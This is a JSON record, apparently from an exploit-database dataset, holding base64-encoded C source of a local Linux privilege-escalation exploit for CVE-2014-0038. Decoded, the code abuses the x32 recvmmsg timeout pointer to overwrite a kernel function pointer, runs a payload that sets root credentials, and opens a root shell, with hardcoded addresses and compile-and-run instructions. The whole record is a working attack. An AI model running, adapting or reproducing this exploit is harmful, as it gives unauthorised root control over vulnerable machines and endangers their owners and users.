{
    "source": "exploit-database", 
    "exploit": "LyoNCiAqIExvY2FsIHJvb3QgZXhwbG9pdCBmb3IgQ1ZFLTIwMTQtMDAzOC4NCiAqDQogKiBodHRwczovL3Jhdy5naXRodWIuY29tL3NhZWxvL2N2ZS0yMDE0LTAwMzgvbWFzdGVyL3RpbWVvdXRwd24uYw0KICoNCiAqIEJ1ZzogVGhlIFg4Nl9YMzIgcmVjdm1tc2cgc3lzY2FsbCBkb2VzIG5vdCBwcm9wZXJseSBzYW5pdGl6ZSB0aGUgdGltZW91dCBwb2ludGVyDQogKiBwYXNzZWQgZnJvbSB1c2Vyc3BhY2UuDQogKg0KICogRXhwbG9pdCBwcmltaXRpdmU6IFBhc3MgYSBwb2ludGVyIHRvIGEga2VybmVsIGFkZHJlc3MgYXMgdGltZW91dCBmb3IgcmVjdm1tc2csDQogKiBpZiB0aGUgb3JpZ2luYWwgYnl0ZSBhdCB0aGF0IGFkZHJlc3MgaXMga25vd24gaXQgY2FuIGJlIG92ZXJ3cml0dGVuDQogKiB3aXRoIGtub3duIGRhdGEuDQogKiBJZiB0aGUgbGVhc3Qgc2lnbmlmaWNhbnQgYnl0ZSBpcyAweGZmLCB3YWl0aW5nIDI1NSBzZWNvbmRzIHdpbGwgdHVybiBpdCBpbnRvIGEgMHgwMC4NCiAqDQogKiBSZXN0cmljdGlvbnM6IFRoZSBmaXJzdCBsb25nIGF0IHRoZSBwYXNzZWQgYWRkcmVzcyAodHZfc2VjKSBoYXMgdG8gYmUgcG9zaXRpdmUNCiAqIGFuZCB0aGUgc2Vjb25kIGxvbmcgKHR2X25zZWMpIGhhcyB0byBiZSBzbWFsbGVyIHRoYW4gMTAwMDAwMDAwMC4NCiAqDQogKiBPdmVydmlldzogVGFyZ2V0IHRoZSByZWxlYXNlIGZ1bmN0aW9uIHBvaW50ZXIgb2YgdGhlIHB0bXhfZm9wcyBzdHJ1Y3R1cmUgbG9jYXRlZCBpbg0KICogbm9uIGluaXRpYWxpemVkIChhbmQgdGh1cyB3cml0YWJsZSkga2VybmVsIG1lbW9yeS4gWmVybyBvdXQgdGhlIHRocmVlIG1vc3QNCiAqIHNpZ25pZmljYW50IGJ5dGVzIGFuZCB0aHVzIHR1cm4gaXQgaW50byBhIHBvaW50ZXIgdG8gYW4gYWRkcmVzcyBtYXBwYWJsZSBpbg0KICogdXNlciBzcGFjZS4NCiAqIFRoZSByZWxlYXNlIHBvaW50ZXIgaXMgdXNlZCBhcyBpdCBpcyBmb2xsb3dlZCBieSAxNiAweDAwIGJ5dGVzIChzbyB0aGUgdHZfbnNlYw0KICogaXMgdmFsaWQpLg0KICogT3BlbiAvZGV2L3B0bXgsIGNsb3NlIGl0IGFuZCBlbmpveS4NCiAqDQogKiBOb3QgdmVyeSBiZWF1dGlmdWwgYnV0IHNob3VsZCBiZSBmYWlybHkgcmVsaWFibGUgaWYgc3ltYm9scyBjYW4gYmUgcmVzb2x2ZWQuDQogKg0KICogVGVzdGVkIG9uIFVidW50dSAxMy4xMA0KICoNCiAqIGdjYyB0aW1lb3V0cHduLmMgLW8gcHduICYmIC4vcHduDQogKg0KICogV3JpdHRlbiBieSBzYWVsbw0KICovDQojZGVmaW5lIF9HTlVfU09VUkNFDQojaW5jbHVkZSA8bmV0aW5ldC9pcC5oPg0KI2luY2x1ZGUgPHN0ZGlvLmg+DQojaW5jbHVkZSA8c3RkbGliLmg+DQojaW5jbHVkZSA8dGltZS5oPg0KI2luY2x1ZGUgPHN0cmluZy5oPg0KI2luY2x1ZGUgPHVuaXN0ZC5oPg0KI2luY2x1ZGUgPGZjbnRsLmg+DQojaW5jbHVkZSA8c3lzL3NvY2tldC5oPg0KI2luY2x1ZGUgPHN5cy9zdGF0Lmg+DQojaW5jbHVkZSA8c3lzL3N5c2NhbGwuaD4NCiNpbmNsdWRlIDxzeXMvd2FpdC5oPg0KI2luY2x1ZGUgPHN5cy9tbWFuLmg+DQoNCiNkZWZpbmUgX19YMzJfU1lTQ0FMTF9CSVQgMHg0MDAwMDAwMA0KI3VuZGVmIF9fTlJfcmVjdm1tc2cNCiNkZWZpbmUgX19OUl9yZWN2bW1zZyAoX19YMzJfU1lTQ0FMTF9CSVQgKyA1MzcpDQoNCiNkZWZpbmUgQlVGU0laRSAyMDANCiNkZWZpbmUgUEFZTE9BRFNJWkUgMHgyMDAwDQojZGVmaW5lIEZPUFNfUkVMRUFTRV9PRkZTRVQgMTMqOA0KDQovKg0KICogQWRhcHQgdGhlc2UgYWRkcmVzc2VzIGZvciB5b3VyIG5lZWQuDQogKiBzZWUgL2Jvb3QvU3lzdGVtLm1hcCogb3IgL3Byb2Mva2FsbHN5bXMNCiAqIFRoZXNlIGFyZSB0aGUgb2Zmc2V0cyBmcm9tIHVidW50dSAzLjExLjAtMTItZ2VuZXJpYy4NCiAqLw0KI2RlZmluZSBQVE1YX0ZPUFMgICAgICAgICAgIDB4ZmZmZmZmZmY4MWZiMzBjMExMDQojZGVmaW5lIFRUWV9SRUxFQVNFICAgICAgICAgMHhmZmZmZmZmZjgxNDJmZWMwTEwNCiNkZWZpbmUgQ09NTUlUX0NSRURTICAgICAgICAweGZmZmZmZmZmODEwOGFkNDBMTA0KI2RlZmluZSBQUkVQQVJFX0tFUk5FTF9DUkVEIDB4ZmZmZmZmZmY4MTA4YjAxMExMDQoNCnR5cGVkZWYgaW50IF9fYXR0cmlidXRlX18oKHJlZ3Bhcm0oMykpKSAoKiBfY29tbWl0X2NyZWRzKSh1bnNpZ25lZCBsb25nIGNyZWQpOw0KdHlwZWRlZiB1bnNpZ25lZCBsb25nIF9fYXR0cmlidXRlX18oKHJlZ3Bhcm0oMykpKSAoKiBfcHJlcGFyZV9rZXJuZWxfY3JlZCkodW5zaWduZWQgbG9uZyBjcmVkKTsNCg0KLyoNCiAqIE1hdGNoIHNpZ25hdHVyZSBvZiBpbnQgcmVsZWFzZShzdHJ1Y3QgaW5vZGUqLCBzdHJ1Y3QgZmlsZSopLg0KICoNCiAqIFNlZSBoZXJlOiBodHRwOi8vZ3JzZWN1cml0eS5uZXQvfnNwZW5kZXIvZXhwbG9pdHMvZW5saWdodGVubWVudC50Z3oNCiAqLw0KaW50IF9fYXR0cmlidXRlX18oKHJlZ3Bhcm0oMykpKQ0Ka2VybmVsX3BheWxvYWQodm9pZCogZm9vLCB2b2lkKiBiYXIpDQp7DQogICAgX2NvbW1pdF9jcmVkcyBjb21taXRfY3JlZHMgPSAoX2NvbW1pdF9jcmVkcylDT01NSVRfQ1JFRFM7DQogICAgX3ByZXBhcmVfa2VybmVsX2NyZWQgcHJlcGFyZV9rZXJuZWxfY3JlZCA9IChfcHJlcGFyZV9rZXJuZWxfY3JlZClQUkVQQVJFX0tFUk5FTF9DUkVEOw0KDQogICAgKigoaW50KikoUFRNWF9GT1BTICsgRk9QU19SRUxFQVNFX09GRlNFVCArIDQpKSA9IC0xOyAgICAvLyByZXN0b3JlIHBvaW50ZXINCiAgICBjb21taXRfY3JlZHMocHJlcGFyZV9rZXJuZWxfY3JlZCgwKSk7DQoNCiAgICByZXR1cm4gLTE7DQp9DQoNCi8qDQogKiBXcml0ZSBhIHplcm8gdG8gdGhlIGJ5dGUgYXQgdGhlbiBnaXZlbiBhZGRyZXNzLg0KICogT25seSB3b3JrcyBpZiB0aGUgY3VycmVudCB2YWx1ZSBpcyAweGZmLg0KICovDQp2b2lkIHplcm9fb3V0KGxvbmcgYWRkcikNCnsNCiAgICBpbnQgc29ja2ZkLCByZXR2YWwsIHBvcnQsIHBpZCwgaTsNCiAgICBzdHJ1Y3Qgc29ja2FkZHJfaW4gc2E7DQogICAgY2hhciBidWZbQlVGU0laRV07DQogICAgc3RydWN0IG1tc2doZHIgbXNnczsNCiAgICBzdHJ1Y3QgaW92ZWMgaW92ZWNzOw0KDQogICAgc3JhbmQodGltZShOVUxMKSk7DQoNCiAgICBwb3J0ID0gMTAyNCArIChyYW5kKCkgJSAoMHgxMDAwMCAtIDEwMjQpKTsNCg0KICAgIHNvY2tmZCA9IHNvY2tldChBRl9JTkVULCBTT0NLX0RHUkFNLCAwKTsNCiAgICBpZiAoc29ja2ZkID09IC0xKSB7DQogICAgICAgIHBlcnJvcigic29ja2V0KCkiKTsNCiAgICAgICAgZXhpdChFWElUX0ZBSUxVUkUpOw0KICAgIH0NCg0KICAgIHNhLnNpbl9mYW1pbHkgICAgICA9IEFGX0lORVQ7DQogICAgc2Euc2luX2FkZHIuc19hZGRyID0gaHRvbmwoSU5BRERSX0xPT1BCQUNLKTsNCiAgICBzYS5zaW5fcG9ydCAgICAgICAgPSBodG9ucyhwb3J0KTsNCiAgICBpZiAoYmluZChzb2NrZmQsIChzdHJ1Y3Qgc29ja2FkZHIgKikgJnNhLCBzaXplb2Yoc2EpKSA9PSAtMSkgew0KICAgICAgICBwZXJyb3IoImJpbmQoKSIpOw0KICAgICAgICBleGl0KEVYSVRfRkFJTFVSRSk7DQogICAgfQ0KDQogICAgbWVtc2V0KCZtc2dzLCAwLCBzaXplb2YobXNncykpOw0KICAgIGlvdmVjcy5pb3ZfYmFzZSAgICAgICAgID0gYnVmOw0KICAgIGlvdmVjcy5pb3ZfbGVuICAgICAgICAgID0gQlVGU0laRTsNCiAgICBtc2dzLm1zZ19oZHIubXNnX2lvdiAgICA9ICZpb3ZlY3M7DQogICAgbXNncy5tc2dfaGRyLm1zZ19pb3ZsZW4gPSAxOw0KDQogICAgLyoNCiAgICAgKiBzdGFydCBhIHNlcGVyYXRlIHByb2Nlc3MgdG8gc2VuZCBhIHVkcCBtZXNzYWdlIGFmdGVyIDI1NSBzZWNvbmRzIHNvIHRoZSBzeXNjYWxsIHJldHVybnMsDQogICAgICogYnV0IG5vdCBhZnRlciB1cGRhdGluZyB0aGUgdGltb3V0IHN0cnVjdCBhbmQgd3JpdGluZyB0aGUgcmVtYWluaW5nIHRpbWUgaW50byBpdC4NCiAgICAgKiAweGZmIC0gMjU1IHNlY29uZHMgPSAweDAwDQogICAgICovDQogICAgcHJpbnRmKCJjbGVhcmluZyBieXRlIGF0IDB4JWx4XG4iLCBhZGRyKTsNCiAgICBwaWQgPSBmb3JrKCk7DQogICAgaWYgKHBpZCA9PSAwKSB7DQogICAgICAgIG1lbXNldChidWYsIDB4NDEsIEJVRlNJWkUpOw0KDQogICAgICAgIGlmICgoc29ja2ZkID0gc29ja2V0KEFGX0lORVQsIFNPQ0tfREdSQU0sIElQUFJPVE9fVURQKSkgPT0gLTEpIHsNCiAgICAgICAgICAgIHBlcnJvcigic29ja2V0KCkiKTsNCiAgICAgICAgICAgIGV4aXQoRVhJVF9GQUlMVVJFKTsNCiAgICAgICAgfQ0KDQogICAgICAgIHNhLnNpbl9mYW1pbHkgICAgICA9IEFGX0lORVQ7DQogICAgICAgIHNhLnNpbl9hZGRyLnNfYWRkciA9IGh0b25sKElOQUREUl9MT09QQkFDSyk7DQogICAgICAgIHNhLnNpbl9wb3J0ICAgICAgICA9IGh0b25zKHBvcnQpOw0KDQogICAgICAgIHByaW50Zigid2FpdGluZyAyNTUgc2Vjb25kcy4uLlxuIik7DQogICAgICAgIGZvciAoaSA9IDA7IGkgPCAyNTU7IGkrKykgew0KICAgICAgICBpZiAoaSAlIDEwID09IDApDQogICAgICAgICAgICAgICAgcHJpbnRmKCIlaXMvMjU1c1xuIiwgaSk7DQogICAgICAgIHNsZWVwKDEpOw0KICAgICAgICB9DQoNCiAgICAgICAgcHJpbnRmKCJ3YWtpbmcgdXAgcGFyZW50Li4uXG4iKTsNCiAgICAgICAgc2VuZHRvKHNvY2tmZCwgYnVmLCBCVUZTSVpFLCAwLCAmc2EsIHNpemVvZihzYSkpOw0KICAgICAgICBleGl0KEVYSVRfU1VDQ0VTUyk7DQogICAgfSBlbHNlIGlmIChwaWQgPiAwKSB7DQogICAgICAgIHJldHZhbCA9IHN5c2NhbGwoX19OUl9yZWN2bW1zZywgc29ja2ZkLCAmbXNncywgMSwgMCwgKHZvaWQqKWFkZHIpOw0KICAgICAgICBpZiAocmV0dmFsID09IC0xKSB7DQogICAgICAgICAgICBwcmludGYoImFkZHJlc3MgY2FuJ3QgYmUgd3JpdHRlbiB0bywgbm90IGEgdmFsaWQgdGltZXNwZWMgc3RydWN0XG4iKTsNCiAgICAgICAgICAgIGV4aXQoRVhJVF9GQUlMVVJFKTsNCiAgICAgICAgfQ0KICAgICAgICB3YWl0cGlkKHBpZCwgMCwgMCk7DQogICAgICAgIHByaW50ZigiYnl0ZSB6ZXJvZWQgb3V0XG4iKTsNCiAgICB9IGVsc2Ugew0KICAgICAgcGVycm9yKCJmb3JrKCkiKTsNCiAgICAgIGV4aXQoRVhJVF9GQUlMVVJFKTsNCiAgICB9DQp9DQoNCmludCBtYWluKGludCBhcmdjLCBjaGFyKiogYXJndikNCnsNCiAgICBsb25nIGNvZGUsIHRhcmdldDsNCiAgICBpbnQgcHduOw0KDQogICAgLyogUHJlcGFyZSBwYXlsb2FkLi4uICovDQogICAgcHJpbnRmKCJwcmVwYXJpbmcgcGF5bG9hZCBidWZmZXIuLi5cbiIpOw0KICAgIGNvZGUgPSAobG9uZyltbWFwKCh2b2lkKikoVFRZX1JFTEVBU0UgJiAweDAwMDAwMGZmZmZmZmYwMDBMTCksIFBBWUxPQURTSVpFLCA3LCAweDMyLCAwLCAwKTsNCiAgICBtZW1zZXQoKHZvaWQqKWNvZGUsIDB4OTAsIFBBWUxPQURTSVpFKTsNCiAgICBjb2RlICs9IFBBWUxPQURTSVpFIC0gMTAyNDsNCiAgICBtZW1jcHkoKHZvaWQqKWNvZGUsICZrZXJuZWxfcGF5bG9hZCwgMTAyNCk7DQoNCiAgICAvKg0KICAgICAqIE5vdyBjbGVhciB0aGUgdGhyZWUgbW9zdCBzaWduaWZpY2FudCBieXRlcyBvZiB0aGUgZm9wcyBwb2ludGVyDQogICAgICogdG8gdGhlIHJlbGVhc2UgZnVuY3Rpb24uDQogICAgICogVGhpcyB3aWxsIG1ha2UgaXQgcG9pbnQgaW50byB0aGUgbWVtb3J5IHJlZ2lvbiBtYXBwZWQgYWJvdmUuDQogICAgICovDQogICAgcHJpbnRmKCJjaGFuZ2luZyBrZXJuZWwgcG9pbnRlciB0byBwb2ludCBpbnRvIGNvbnRyb2xsZWQgYnVmZmVyLi4uXG4iKTsNCiAgICB0YXJnZXQgPSBQVE1YX0ZPUFMgKyBGT1BTX1JFTEVBU0VfT0ZGU0VUOw0KICAgIHplcm9fb3V0KHRhcmdldCArIDcpOw0KICAgIHplcm9fb3V0KHRhcmdldCArIDYpOw0KICAgIHplcm9fb3V0KHRhcmdldCArIDUpOw0KDQogICAgLyogLi4uIGFuZCB0cmlnZ2VyLiAqLw0KICAgIHByaW50ZigicmVsZWFzaW5nIGZpbGUgZGVzY3JpcHRvciB0byBjYWxsIG1hbmlwdWxhdGVkIHBvaW50ZXIgaW4ga2VybmVsIG1vZGUuLi5cbiIpOw0KICAgIHB3biA9IG9wZW4oIi9kZXYvcHRteCIsICdyJyk7DQogICAgY2xvc2UocHduKTsNCg0KICAgIGlmIChnZXR1aWQoKSAhPSAwKSB7DQogICAgICAgIHByaW50ZigiZmFpbGVkIHRvIGdldCByb290IDooXG4iKTsNCiAgICAgICAgZXhpdChFWElUX0ZBSUxVUkUpOw0KICAgIH0NCg0KICAgIHByaW50ZigiZ290IHJvb3QsIGVuam95IDopXG4iKTsNCiAgICByZXR1cm4gZXhlY2woIi9iaW4vYmFzaCIsICItc2giLCBOVUxMKTsNCn0=", 
    "filename": "platforms/linux/local/31346.c", 
    "id": "31346", 
    "cves": [
        "CVE-2014-0038"
    ]
}